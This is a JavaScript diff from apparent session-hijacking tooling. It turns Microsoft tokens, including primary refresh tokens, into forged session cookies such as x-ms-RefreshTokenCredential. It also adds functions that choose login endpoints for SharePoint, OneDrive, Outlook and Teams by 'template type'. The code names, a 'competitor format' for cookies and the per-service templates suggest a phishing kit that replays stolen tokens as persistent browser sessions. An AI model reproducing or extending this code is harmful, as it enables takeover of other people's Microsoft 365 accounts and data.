@@ -36,39 +36,31 @@ function detectAccountType(email) {
  * Detect account type from multiple signals
  */
 function detectAccountTypeFromContext(token, email, tenant) {
-  // Personal accounts use consumers endpoint
   if (tenant === 'consumers') return 'personal';
-  // Check token format
   if (token && (token.startsWith('0.AT') || token.startsWith('M.R'))) {
     if (email) { return detectAccountType(email); }
     return 'work_school';
   }
-  // If token is JSON with PRT field, it's work/school
   if (token) {
     try {
       const parsed = JSON.parse(token);
       if (parsed.prt) return 'work_school';
     } catch (e) {}
   }
-  // Email domain detection
   if (email) { return detectAccountType(email); }
   return 'unknown';
 }
 
 /**
  * Generate x-ms-RefreshTokenCredential cookie in competitor format
- * This is the key cookie for persistent sessions
  */
 function generateXmsRefreshTokenCredential(refreshToken, accountType) {
   let cookieValue;
   if (accountType === 'work_school' && typeof refreshToken === 'string' && refreshToken.startsWith('{')) {
-    // Already JSON (PRT format from competitor) - store as-is
     cookieValue = refreshToken;
   } else if (accountType === 'personal') {
-    // Personal accounts: cannot use x-ms-RefreshTokenCredential
     return { name: '', value: '', domain: '' };
   } else {
-    // Work/school with plain token: create standard format
     const credential = JSON.stringify({
       token_type: 'Bearer',
       refresh_token: refreshToken,
@@ -95,7 +87,6 @@ async function convertTokensToCookies(accessToken, templateType, tenant, email, 
   const isPersonal = accountType === 'personal';
 
   try {
-    // Use different scope and endpoint for personal vs work
     const scope = isPersonal 
       ? 'openid profile email offline_access' 
       : 'https://graph.microsoft.com/.default offline_access openid profile';
@@ -103,13 +94,9 @@ async function convertTokensToCookies(accessToken, templateType, tenant, email, 
     const exchangeResult = await exchangeTokenForCookies(accessToken, tenant, accountType, scope);
     if (!exchangeResult.success) { return exchangeResult; }
 
-    // Collect additional cookies from service endpoints
     const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email, accountType);
-
-    // Generate x-ms-RefreshTokenCredential cookie
     const xmsCookie = generateXmsRefreshTokenCredential(exchangeResult.new_refresh_token || accessToken, accountType);
 
-    // Combine all cookies (skip empty xmsCookie for personal accounts)
     const allCookies = xmsCookie.name ? [xmsCookie, ...exchangeResult.cookies, ...serviceCookies] : [...exchangeResult.cookies, ...serviceCookies];
 
     if (allCookies.length === 0) {
@@ -240,6 +227,42 @@ function getServiceEndpoints(templateType, tenant, email, accountType) {
     }
   }
   return endpoints;
+}
+
+/**
+ * Determine primary endpoint for template type
+ */
+function determineEndpoint(templateType, tenant, email, accountType) {
+  const type = (templateType || '').toLowerCase();
+  if (accountType === 'personal') {
+    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
+    if (type.includes('onedrive')) return 'https://onedrive.live.com/';
+    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.live.com/owa/';
+    if (type.includes('teams')) return 'https://teams.microsoft.com/';
+    return 'https://www.office.com/';
+  } else {
+    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
+    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
+    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
+    if (type.includes('teams')) return 'https://teams.microsoft.com/';
+    if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
+    return 'https://www.office.com/';
+  }
+}
+
+/**
+ * Determine resource URL for template type
+ */
+function determineResource(templateType, tenant, accountType) {
+  const type = (templateType || '').toLowerCase();
+  if (accountType === 'personal') {
+    if (type.includes('onedrive')) return 'https://onedrive.live.com';
+    return 'https://graph.microsoft.com';
+  } else {
+    if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
+    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
+    return 'https://graph.microsoft.com';
+  }
 }
 
 /**
